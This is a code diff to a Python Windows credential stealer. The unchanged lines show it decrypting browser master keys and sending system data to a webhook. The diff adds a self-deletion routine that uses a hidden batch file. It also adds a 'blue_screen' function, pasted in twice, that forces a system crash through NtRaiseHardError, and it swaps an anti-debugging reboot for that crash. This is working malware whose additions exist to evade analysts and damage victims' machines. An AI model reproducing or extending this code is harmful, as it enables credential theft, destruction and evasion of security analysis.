@@ -19,6 +19,8 @@ import win32profile
 import tempfile
 import getpass
 import sys
+import ctypes
+from ctypes import wintypes, byref, c_bool
 from Crypto.Cipher import AES
 
 __CONFIG__ = {
@@ -75,6 +77,19 @@ def kill(name):
             notkilled = True
             continue
     return killed
+
+def self_delete():
+    try:
+        if platform.system() == 'Windows':
+            bat_file = os.path.join(os.environ['TEMP'], f"{random.randint(1000, 9999)}.bat")
+            with open(bat_file, 'w') as f:
+                f.write(f'@echo off\ntimeout /t 3 /nobreak > nul\ndel /f /q "{os.path.abspath(sys.argv[0])}"\ndel /f /q "{bat_file}"')
+            subprocess.Popen(bat_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        else:
+            os.remove(sys.argv[0])
+    except:
+        pass
+    sys.exit(0)
 
 def get_master_key(path: str):
     local_state_path = os.path.join(path, "Local State")
@@ -436,6 +451,31 @@ def systeminformation():
         }
     requests.post(__CONFIG__["webhook"], json=embed)
 
+def blue_screen():
+    if platform.system() == 'Windows':
+        try:
+            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(c_bool()))
+            ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, byref(wintypes.DWORD()))
+        except:
+            os.system("taskkill /f /im explorer.exe")
+            self_delete()
+    else:
+        print("\033[44m" + " " * 1000 + "\nSIMULATED BLUE SCREEN\nANTI-ANALYSIS TRIGGERED" + " " * 1000 + "\033[0m")
+    self_delete()
+
+def blue_screen():
+    if platform.system() == 'Windows':
+        try:
+            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(c_bool()))
+            ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, byref(wintypes.DWORD()))
+        except:
+            os.system("taskkill /f /im explorer.exe")
+            self_delete()
+    else:
+        print("\033[44m" + " " * 1000 + "\nSIMULATED BLUE SCREEN\nANTI-ANALYSIS TRIGGERED" + " " * 1000 + "\033[0m")
+    self_delete()
+
+
 def debug_hwid():
     import uuid
     return str(uuid.UUID(int=uuid.getnode()))
@@ -529,7 +569,7 @@ def debug():
         debugs = True
 
     if debugs:
-        os.system("shutdown /r /t 0") 
+        blue_screen()
     else:
         debugs = False
     
